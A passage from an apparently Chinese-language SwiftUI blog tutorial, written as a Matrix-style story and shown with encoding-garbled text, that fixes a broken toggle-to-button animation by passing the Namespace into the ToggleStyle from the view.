<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0695838864b74e16accc949068add827~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=3EabX7W9vxIyvN2YQWkz3wZHuaQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä¸Šé¢çš„ <code>ConditionalToggleStyle</code> ä¹‹æ‰€ä»¥èƒ½å·¥ä½œï¼Œæ˜¯å› ä¸º <code>makeBody</code> è¿”å›çš„æ˜¯ <code>some View</code>ã€‚SwiftUI çš„ ViewBuilder ä¼šæŠŠ <code>if-else</code> è½¬æ¢æˆ <code>_ConditionalContent&lt;ViewA, ViewB&gt;</code>ã€‚è™½ç„¶ Button å’Œ Switch æ¸²æŸ“å‡ºæ¥çš„ View ç±»å‹ä¸åŒï¼Œä½†å®ƒä»¬éƒ½è¢«åŒ…è£…åœ¨è¿™ä¸ªæ¡ä»¶å®¹å™¨é‡Œäº†ã€‚</p>
<h2 data-id="heading-5">ğŸ¬ å¤§ç»“å±€ï¼šå®Œç¾çš„è°ƒç”¨</h2>
<p>æˆ‘æŠŠå°è£…å¥½çš„ä»£ç æ¨é€åˆ°ä¸»å±å¹•ã€‚ç°åœ¨çš„ <code>ContentView</code> å¹²å‡€å¾—ä»¤äººå‘æŒ‡ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">FinalShowdownView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isOn <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isButtonMode <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span>(spacing: <span class="hljs-number">40</span>) {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Weapon Status: <span class="hljs-subst">\(isOn <span class="hljs-operator">?</span> <span class="hljs-string">"ACTIVE"</span> : <span class="hljs-string">"IDLE"</span>)</span>"</span>)
                .font(.monospaced(.title3)())
                .foregroundColor(isOn <span class="hljs-operator">?</span> .green : .gray)
            
            <span class="hljs-comment">// è§è¯å¥‡è¿¹çš„æ—¶åˆ»</span>
            <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Fire Mode"</span>, isOn: <span class="hljs-variable">$isOn</span>)
                <span class="hljs-comment">// è¿™é‡Œçš„ .animation å¿…é¡»è·Ÿåœ¨ style åé¢æˆ–è€…ç»‘å®šåœ¨ value ä¸Š</span>
                .toggleStyle(<span class="hljs-type">ConditionalToggleStyle</span>(isButtonMode: isButtonMode))
                <span class="hljs-comment">// åŠ ä¸Šè¿™ä¸ª frame æ˜¯ä¸ºäº†é˜²æ­¢ Switch å˜ Button æ—¶å®½åº¦è·³å˜å¤ªå¤§</span>
                <span class="hljs-comment">// å°±åƒæµ©å…‹å˜èº«å¾—æ’‘ç ´è£¤å­ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¡å¼¹æ€§å¥½çš„è£¤å­</span>
                .frame(maxWidth: <span class="hljs-number">200</span>) 
            
            <span class="hljs-type">Button</span> {
                withAnimation(.easeInOut(duration: <span class="hljs-number">0.4</span>)) {
                    isButtonMode.toggle()
                }
            } label: {
                <span class="hljs-type">Text</span>(<span class="hljs-string">"Hack the System"</span>)
                    .fontWeight(.bold)
                    .padding()
                    .background(<span class="hljs-type">Color</span>.purple.opacity(<span class="hljs-number">0.2</span>))
                    .cornerRadius(<span class="hljs-number">10</span>)
            }
        }
    }
}
</code></pre>
<p>æˆ‘æŒ‰ä¸‹ "Hack the System" æŒ‰é’®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bca686ac45cc4fe0b146bea7ab3bad6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=1NB1CK3ypcli%2BPnHXcReaSJmuSE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å±å¹•ä¸Šçš„ Toggle å¹¶æ²¡æœ‰ç”Ÿç¡¬åœ°æ¶ˆå¤±å†å‡ºç°ï¼Œè€Œæ˜¯å¦‚åŒæ¶²ä½“é‡‘å±ä¸€èˆ¬ï¼Œä»æ»‘å—å½¢æ€è‡ªç„¶åœ°æ”¶ç¼©ã€å½¢å˜ï¼Œæœ€ç»ˆå‡å›ºæˆä¸€ä¸ªæŒ‰é’®ã€‚ç‚¹å‡»å®ƒï¼ŒçŠ¶æ€åŒæ­¥å®Œç¾ï¼Œæ¯«æ— è¿Ÿæ»ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6eb3398a46fd4efdb46aedf29aca932b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=Pu4QS2xrkh85Huk9wUHy0%2BF3%2BWQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Trinity çœ‹ç€å±å¹•ï¼Œå˜´è§’ç»ˆäºå¾®å¾®ä¸Šæ‰¬ï¼šâ€œçœ‹æ¥ä½ è¿˜æ²¡ç”Ÿé”ˆï¼ŒNeoã€‚â€</p>
<p>çªç„¶ï¼ŒæŠ¥è­¦çº¢ç¯äº®èµ·ã€‚Agent Refactor çš„å…¨æ¯æŠ•å½±å‡ºç°åœ¨åŠç©ºï¼Œä»–å’†å“®ç€ï¼šâ€œä¸å¯é¥¶æ•ï¼ä½ ä»¬ç«Ÿç„¶åœ¨ä¸€ä¸ª <code>makeBody</code> é‡Œå®ä¾‹åŒ–äº†ä¸¤ä¸ªä¸åŒçš„ Styleï¼è¿™æ˜¯å¯¹é™æ€æ´¾å‘çš„äºµæ¸ï¼â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/022de73c45f44754894d286eb00e0c9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=zHxyMMtxzdXnnvwY05dDy%2FQ%2B%2FpA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æˆ‘åˆä¸Šç”µè„‘ï¼Œæˆ´ä¸Šå¢¨é•œï¼Œå¯¹ Trinity ç¬‘äº†ç¬‘ï¼šâ€œèµ°å§ã€‚åœ¨ä»–å‘ç°æˆ‘ä»¬è¿˜åœ¨ç”¨ <code>AnyView</code> ä¹‹å‰ã€‚â€</p>
<hr/>
<h2 data-id="heading-6">ğŸ‘€ SwiftUI æ¶¨çŸ¥è¯†å¤–ä¼ ï¼šä¿®å¤â€œåŠ¨ç”»å¤±æ•ˆâ€çš„ç»ˆæè¡¥ä¸ï¼ˆNamespace çš„ç”Ÿå‘½å‘¨æœŸï¼‰</h2>
<p>è¿™é‡Œæ˜¯ <strong>Neo</strong>ã€‚</p>
<p>è¿™çœŸæ˜¯ä¸€ä¸ªè®© <strong>Agent Refactor</strong> ç¬‘æ‰å¤§ç‰™çš„ä½çº§å¤±è¯¯ã€‚æˆ‘å±…ç„¶çŠ¯äº†â€œå®‡å®™é‡å¯â€çš„é”™è¯¯ã€‚</p>
<p><strong>Trinity</strong> çœ‹ç€æ¯«æ— ååº”çš„å±å¹•ï¼ŒæŠŠå’–å•¡æ¯é‡é‡åœ°é¡¿åœ¨æ¡Œå­ä¸Šï¼šâ€œNeoï¼Œä½ æ˜¯åœ¨é€—æˆ‘å—ï¼Ÿä½ åœ¨ <code>ToggleStyle</code> è¿™ä¸ªç»“æ„ä½“é‡Œå£°æ˜äº† <code>@Namespace</code>ã€‚æ¯æ¬¡ View åˆ·æ–°ï¼Œ<code>QuantumToggleStyle</code> é‡æ–°åˆå§‹åŒ–ï¼Œé‚£ä¸ª Namespace å°±è¢«é”€æ¯é‡å»ºäº†ã€‚<strong>ä½ æ˜¯åœ¨è¯•å›¾è¿æ¥ä¸¤ä¸ªæ¯«æ— å…³è”çš„å¹³è¡Œå®‡å®™ï¼</strong>â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c2ddb3d0cef4308ad5a3cc37384aa4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=6vsYclXsuXwuuzaEEuySbcpZshg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¥¹è¯´å¾—å¯¹ã€‚<strong>Namespace å¿…é¡»æ˜¯æ°¸æ’çš„</strong>ï¼Œä¸èƒ½éšç€ Style çš„é‡æ–°åˆ›å»ºè€Œæ¶ˆäº¡ã€‚æˆ‘ä»¬å¿…é¡»æŠŠè¿™ä¸ªâ€œå®‡å®™åæ ‡ç³»â€ä»å¤–éƒ¨ä¼ è¿›å»ï¼Œè€Œä¸æ˜¯åœ¨å†…éƒ¨ä¸€æ¬¡æ€§ç”Ÿæˆã€‚</p>
<p>è¿™å°±å¥½æ¯”ä½ æƒ³ç”¨è™«æ´è¿æ¥ä¸¤ä¸ªç‚¹ï¼Œç»“æœä½ æ¯èµ°ä¸€æ­¥å°±æŠŠæ•´ä¸ªå®‡å®™ç‚¸äº†é‡é€ ï¼Œè™«æ´å½“ç„¶è¿ä¸èµ·æ¥ã€‚</p>
<p>æ¥å§ï¼Œè®©æˆ‘ä»¬ä¿®è¡¥è¿™ä¸ªæ—¶ç©ºè£‚ç¼ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34850ee4199f419d86255ac93fe44daf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=SFxsWM6WW8xCSipSkOdi0UF4J6s%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">ğŸ•µï¸â€â™‚ï¸ çœŸæ­£çš„ Bugï¼šNamespace çš„ç”Ÿå‘½å‘¨æœŸ</h2>
<p>åœ¨ SwiftUI ä¸­ï¼Œ<code>.toggleStyle(MyStyle())</code> æ¯æ¬¡è¢«è°ƒç”¨ï¼ˆå½“çŠ¶æ€æ”¹å˜å¼•å‘é‡ç»˜æ—¶ï¼‰ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ <code>MyStyle</code> ç»“æ„ä½“å®ä¾‹ã€‚</p>
<p>å¦‚æœä½ æŠŠ <code>@Namespace private var space</code> å†™åœ¨ <code>ToggleStyle</code> ç»“æ„ä½“é‡Œï¼š</p>
<ol>
<li>çŠ¶æ€æ”¹å˜ï¼ˆhackMode å˜äº†ï¼‰ã€‚</li>
<li>SwiftUI åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>QuantumToggleStyle</code>ã€‚</li>
<li><strong>æ–°çš„ Style äº§ç”Ÿäº†ä¸€ä¸ªå…¨æ–°çš„ Namespaceã€‚</strong></li>
<li><code>matchedGeometryEffect</code> å‘ç°ï¼šâ€œå’¦ï¼Ÿä¸Šä¸€æ¬¡çš„ ID æ˜¯åœ¨æ—§å®‡å®™é‡Œï¼Œè¿™æ¬¡æ˜¯åœ¨æ–°å®‡å®™é‡Œï¼Œæ‰¾ä¸åˆ°åŒ¹é…å¯¹è±¡ã€‚â€</li>
<li><strong>ç»“æœï¼š</strong> æ²¡æœ‰è¡¥é—´åŠ¨ç”»ï¼Œåªæœ‰ç”Ÿç¡¬çš„çªå˜ã€‚</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99fd2e6fe2154ac9a70c7c8ec1b97cfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=WV3CWtUpTLCsvWLZ%2F5LE5y0m008%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-8">ğŸ’‰ æ‰‹æœ¯æ–¹æ¡ˆï¼šä¾èµ–æ³¨å…¥</h2>
<p>æˆ‘ä»¬éœ€è¦åœ¨ <strong>Viewï¼ˆæ´»å¾—ä¹…çš„é‚£ä¸ªï¼‰</strong> é‡Œåˆ›å»º Namespaceï¼Œç„¶åæŠŠå®ƒåƒä¼ å®¶å®ä¸€æ ·ä¼ ç»™ <strong>Styleï¼ˆæ´»å¾—çŸ­çš„é‚£ä¸ªï¼‰</strong>ã€‚</p>
<p>åŒæ—¶ï¼Œä¸ºäº†è®©æ›¿æ¢è¿‡ç¨‹ä¸å‡ºç°â€œé—ªçƒâ€ï¼Œæˆ‘ä»¬éœ€è¦æ˜¾å¼åœ°åŠ ä¸Š <code>.transition</code>ï¼Œå‘Šè¯‰ SwiftUI åœ¨å˜å½¢çš„åŒæ—¶å¦‚ä½•å¤„ç†é€æ˜åº¦ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0d3a8610e8646f7974a585e5ce7ad92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=x97cuh92Lw7l5G6EEAo5tvZ2cYQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-9">ğŸ§¬ æœ€ç»ˆä¿®æ­£ç‰ˆä»£ç  (Copy-Paste Ready)</h2>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> SwiftUI

<span class="hljs-comment">// MARK: - The "Quantum" Toggle Style (Fixed)</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">QuantumToggleStyle</span>: <span class="hljs-title class_">ToggleStyle</span> {
    <span class="hljs-comment">// âš ï¸ å…³é”®ä¿®æ­£ï¼šä¸å†è‡ªå·±æŒæœ‰ Namespaceï¼Œè€Œæ˜¯æ¥æ”¶å¤–éƒ¨ä¼ å…¥çš„ ID</span>
    <span class="hljs-comment">// è¿™ä¿è¯äº†å³ä¾¿ Style è¢«é‡æ–°åˆ›å»ºï¼Œåæ ‡ç³»ä¾ç„¶æ˜¯åŒä¸€ä¸ª</span>
    <span class="hljs-keyword">var</span> namespace: <span class="hljs-type">Namespace</span>.<span class="hljs-type">ID</span>
    
    <span class="hljs-comment">// çŠ¶æ€æ§åˆ¶</span>
    <span class="hljs-keyword">var</span> isButtonMode: <span class="hljs-type">Bool</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">LabelID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SoulLabel"</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">ContainerID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"BodyContainer"</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">KnobID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SwitchKnob"</span> <span class="hljs-comment">// æ–°å¢ï¼šç»™ Switch çš„æ»‘å—ä¹Ÿç•™ä¸ªä½ç½®ï¼ˆå¯é€‰ï¼‰</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeBody</span>(<span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Group</span> {
            <span class="hljs-keyword">if</span> isButtonMode {
                <span class="hljs-comment">// MARK: - Button Mode</span>
                <span class="hljs-type">Button</span> {
                    configuration.isOn.toggle()
                } label: {
                    <span class="hljs-type">HStack</span> {
                        configuration.label
                            .matchedGeometryEffect(id: <span class="hljs-type">LabelID</span>, in: namespace)
                            .foregroundColor(.accentColor)
                        
                        <span class="hljs-type">Spacer</span>()
                        
                        <span class="hljs-comment">// å ä½ç¬¦ï¼šç”¨äºæ¨¡æ‹Ÿ Switch çš„å®½åº¦</span>
                        <span class="hljs-type">Color</span>.clear
                            .frame(width: <span class="hljs-number">51</span>, height: <span class="hljs-number">31</span>)
                    }
                    .contentShape(<span class="hljs-type">Rectangle</span>())
                }
                .buttonStyle(.plain)
                .padding(.vertical, <span class="hljs-number">8</span>)
                .padding(.horizontal, <span class="hljs-number">0</span>)
                <span class="hljs-comment">// èƒŒæ™¯åŒ¹é…</span>
                .background(
                    <span class="hljs-type">RoundedRectangle</span>(cornerRadius: <span class="hljs-number">8</span>)
                        .fill(<span class="hljs-type">Color</span>.gray.opacity(<span class="hljs-number">0.1</span>))
                        .matchedGeometryEffect(id: <span class="hljs-type">ContainerID</span>, in: namespace)
                )
                <span class="hljs-comment">// âš ï¸ å…³é”®ï¼šåŠ ä¸Š transitionï¼Œé˜²æ­¢è§†å›¾ç›´æ¥ç¡¬æ›¿æ¢</span>
                .transition(.opacity.animation(.easeInOut(duration: <span class="hljs-number">0.2</span>)))
                
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// MARK: - Switch Mode</span>
                <span class="hljs-type">HStack</span> {
                    configuration.label
                        .matchedGeometryEffect(id: <span class="hljs-type">LabelID</span>, in: namespace)
                        .foregroundColor(.primary)
                    
                    <span class="hljs-type">Spacer</span>()
                    
                    <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬ä¸ºäº†è§†è§‰å®Œç¾ï¼Œæ‰‹åŠ¨æ‹†è§£ Toggle</span>
                    <span class="hljs-comment">// æˆ–è€…ä¾ç„¶ä½¿ç”¨åŸç”Ÿ Toggleï¼Œä½†åŒ…è£¹åœ¨å®¹å™¨é‡Œ</span>
                    <span class="hljs-type">Toggle</span>(<span class="hljs-string">""</span>, isOn: configuration.<span class="hljs-variable">$isOn</span>)
                        .labelsHidden()
                        .toggleStyle(<span class="hljs-type">SwitchToggleStyle</span>(tint: .green))
                        <span class="hljs-comment">// è¿™é‡Œä¸éœ€è¦ matchedGeometryEffect å¼ºè¡ŒåŒ¹é…æ»‘å—å†…éƒ¨</span>
                        <span class="hljs-comment">// å› ä¸º Switch æœ¬èº«æ˜¯ä¸€ä¸ªå¤æ‚çš„ UIKit å°è£…ï¼Œå¾ˆéš¾æ‹†è§£</span>
                        <span class="hljs-comment">// æˆ‘ä»¬ä¸»è¦åŒ¹é…çš„æ˜¯ Label å’Œæ•´ä½“å®¹å™¨ä½ç½®</span>
                }
                .padding(.vertical, <span class="hljs-number">8</span>)
                <span class="hljs-comment">// èƒŒæ™¯åŒ¹é…ï¼ˆSwitch æ¨¡å¼ä¸‹èƒŒæ™¯é€šå¸¸æ˜¯é€æ˜çš„ï¼Œæˆ–è€…æ˜¯æ•´ä¸ª Row çš„èƒŒæ™¯ï¼‰</span>
                <span class="hljs-comment">// æˆ‘ä»¬ç»™ä¸€ä¸ªé€æ˜èƒŒæ™¯æ¥æ‰¿æ¥åŠ¨ç”»</span>
                .background(
                    <span class="hljs-type">RoundedRectangle</span>(cornerRadius: <span class="hljs-number">8</span>)
                        .fill(<span class="hljs-type">Color</span>.clear)
                        .matchedGeometryEffect(id: <span class="hljs-type">ContainerID</span>, in: namespace)
                )
                <span class="hljs-comment">// âš ï¸ å…³é”®ï¼šåŒä¸Šï¼ŒåŠ ä¸Šè¿‡æ¸¡</span>
                .transition(.opacity.animation(.easeInOut(duration: <span class="hljs-number">0.2</span>)))
            }
        }
    }
}

<span class="hljs-comment">// MARK: - The Main View</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MatrixControlView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-comment">// âš ï¸ ä¿®æ­£ï¼šNamespace å¿…é¡»ç”Ÿå­˜åœ¨ View çš„ç”Ÿå‘½å‘¨æœŸé‡Œ</span>
    <span class="hljs-meta">@Namespace</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> animationScope
    
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> weaponActive <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> hackMode <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">ZStack</span> {
            <span class="hljs-type">Color</span>.black.edgesIgnoringSafeArea(.all)
            
            <span class="hljs-type">VStack</span>(spacing: <span class="hljs-number">30</span>) {
                <span class="hljs-comment">// Header</span>
                <span class="hljs-type">HStack</span>(spacing: <span class="hljs-number">15</span>) {
                    <span class="hljs-type">Circle</span>()
                        .fill(weaponActive <span class="hljs-operator">?</span> <span class="hljs-type">Color</span>.green : <span class="hljs-type">Color</span>.red)
                        .frame(width: <span class="hljs-number">10</span>, height: <span class="hljs-number">10</span>)
                        .shadow(color: weaponActive <span class="hljs-operator">?</span> .green : .red, radius: <span class="hljs-number">5</span>)
                    
                    <span class="hljs-type">Text</span>(weaponActive <span class="hljs-operator">?</span> <span class="hljs-string">"SYSTEM: <span class="hljs-subst">\(hackMode <span class="hljs-operator">?</span> <span class="hljs-string">"HACKED"</span> : <span class="hljs-string">"SECURE"</span>)</span>"</span> : <span class="hljs-string">"SYSTEM: OFFLINE"</span>)
                        .font(.monospaced(.headline)())
                        .foregroundColor(weaponActive <span class="hljs-operator">?</span> .green : .red)
                        <span class="hljs-comment">// å½“ hackMode åˆ‡æ¢æ—¶ï¼Œæ–‡å­—ä¼šæœ‰è½»å¾®å˜åŠ¨ï¼Œè¿™é‡ŒåŠ ä¸ªåŠ¨ç”»é¿å…è·³åŠ¨</span>
                        .animation(.none, value: hackMode) 
                    
                    <span class="hljs-type">Spacer</span>()
                }
                .padding(.horizontal)
                .frame(width: <span class="hljs-number">320</span>)
                
                <span class="hljs-comment">// --- è§è¯å¥‡è¿¹çš„ Toggle ---</span>
                <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Neural Link"</span>, isOn: <span class="hljs-variable">$weaponActive</span>)
                    .font(.system(size: <span class="hljs-number">18</span>, weight: .medium))
                    <span class="hljs-comment">// âš ï¸ æ³¨å…¥ï¼šå°† View çš„ Namespace ä¼ ç»™ Style</span>
                    .toggleStyle(<span class="hljs-type">QuantumToggleStyle</span>(namespace: animationScope, isButtonMode: hackMode))
                    <span class="hljs-comment">// ç»™æ•´ä¸ªå®¹å™¨åŠ ä¸€ä¸ª frameï¼Œé˜²æ­¢ Button æ¨¡å¼å’Œ Switch æ¨¡å¼é«˜åº¦å¾®å°å·®å¼‚å¯¼è‡´çš„æŠ–åŠ¨</span>
                    .frame(width: <span class="hljs-number">320</span>)
                    .padding()
                    .background(<span class="hljs-type">Color</span>.gray.opacity(<span class="hljs-number">0.15</span>))
                    .cornerRadius(<span class="hljs-number">12</span>)
                    <span class="hljs-comment">// è¿™é‡Œçš„åŠ¨ç”»æ˜¯ç»™ Style å†…éƒ¨ç”Ÿæ•ˆçš„å…³é”®</span>
                    <span class="hljs-comment">// ä¹Ÿå¯ä»¥åœ¨ Button action é‡Œç”¨ explicit animationï¼Œä½†è¿™é‡ŒåŠ ä¸Šä¿é™©</span>
                    .animation(.spring(response: <span class="hljs-number">0.5</span>, dampingFraction: <span class="hljs-number">0.7</span>), value: hackMode)
                
                <span class="hljs-comment">// Trigger Button</span>
                <span class="hljs-type">Button</span> {
                    <span class="hljs-comment">// æ˜¾å¼åŠ¨ç”»</span>
                    withAnimation(.spring(response: <span class="hljs-number">0.5</span>, dampingFraction: <span class="hljs-number">0.7</span>)) {
                        hackMode.toggle()
                    }
                } label: {
                    <span class="hljs-type">HStack</span> {
                        <span class="hljs-type">Image</span>(systemName: <span class="hljs-string">"arrow.triangle.2.circlepath"</span>)
                            .rotationEffect(.degrees(hackMode <span class="hljs-operator">?</span> <span class="hljs-number">180</span> : <span class="hljs-number">0</span>))
                        <span class="hljs-type">Text</span>(hackMode <span class="hljs-operator">?</span> <span class="hljs-string">"Revert to Switch"</span> : <span class="hljs-string">"Hack to Button"</span>)
                    }
                    .font(.callout.bold())
                    .foregroundColor(.white)
                    .padding(.vertical, <span class="hljs-number">12</span>)
                    .padding(.horizontal, <span class="hljs-number">24</span>)
                    .background(
                        <span class="hljs-type">Capsule</span>()
                            .fill(<span class="hljs-type">LinearGradient</span>(
                                colors: hackMode <span class="hljs-operator">?</span> [.orange, .red] : [.blue, .purple],
                                startPoint: .leading,
                                endPoint: .trailing
                            ))
                    )
                    .shadow(radius: <span class="hljs-number">10</span>)
                }
                .padding(.top, <span class="hljs-number">20</span>)
            }
        }
    }
}

<span class="hljs-comment">// MARK: - Preview</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MatrixControlView_Previews</span>: <span class="hljs-title class_">PreviewProvider</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">var</span> previews: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">MatrixControlView</span>()
    }
}
</code></pre>
<h2 data-id="heading-10">ğŸ§  æŠ€æœ¯å¤ç›˜ï¼šä¸ºä»€ä¹ˆè¿™èƒ½è¡Œï¼Ÿ</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0dfeadddce946eb87d82cebec562d76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=FzH2xm0ESfc870K59RInL5L0%2Fck%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<ol>
<li>
<p><strong>å®‡å®™å¸¸æ•° (<code>@Namespace</code> in View)</strong>ï¼š
ç°åœ¨ <code>animationScope</code> å­˜åœ¨äº <code>MatrixControlView</code> ä¸­ã€‚æ— è®º <code>hackMode</code> å¦‚ä½•æ”¹å˜ï¼Œ<code>MatrixControlView</code> åªæ˜¯é‡ç»˜ï¼Œä½†å®ƒçš„ State å’Œ Namespace æ˜¯æŒä¹…çš„ã€‚</p>
</li>
<li>
<p><strong>è™«æ´è¿æ¥ (Dependency Injection)</strong>ï¼š
æˆ‘ä»¬å°†è¿™ä¸ªæŒä¹…çš„ ID ä¼ ç»™äº† <code>QuantumToggleStyle</code>ã€‚è™½ç„¶ Style ç»“æ„ä½“è¢«é‡å»ºäº†ï¼Œä½†å®ƒæ‰‹é‡Œæ‹¿çš„ ID è¿˜æ˜¯åŸæ¥é‚£ä¸ªã€‚<code>matchedGeometryEffect</code> ç»ˆäºèƒ½è®¤å‡ºï¼šâ€œå“¦ï¼Œè¿™å°±æ˜¯åˆšæ‰é‚£ä¸ª <code>SoulLabel</code>ï¼Œæˆ‘è¦æŠŠå®ƒå¹³æ»‘åœ°ç§»åˆ°æ–°ä½ç½®ã€‚â€</p>
</li>
<li>
<p><strong>è¿‡æ¸¡åè®® (<code>.transition</code>)</strong>ï¼š
ç”±äºæˆ‘ä»¬æ˜¯åœ¨ <code>if-else</code> é‡Œå®Œå…¨åˆ‡æ¢äº†è§†å›¾å±‚çº§ï¼ˆä¸€ä¸ªæ˜¯ <code>Button</code>ï¼Œä¸€ä¸ªæ˜¯ <code>HStack</code>ï¼‰ï¼ŒSwiftUI é»˜è®¤ä¼šç›´æ¥ç§»é™¤æ—§çš„ã€æ’å…¥æ–°çš„ã€‚åŠ ä¸Š <code>.transition(.opacity)</code> é…åˆ <code>matchedGeometryEffect</code>ï¼ŒSwiftUI å°±ä¼šæ··åˆä¸¤è€…çš„åƒç´ ï¼š</p>
<ul>
<li><strong>ä½ç½®/å°ºå¯¸</strong>ï¼šç”± <code>matchedGeometryEffect</code> è´Ÿè´£æ’å€¼ã€‚</li>
<li><strong>æ·¡å…¥/æ·¡å‡º</strong>ï¼šç”± <code>.transition</code> è´Ÿè´£ã€‚</li>
</ul>
</li>
</ol>
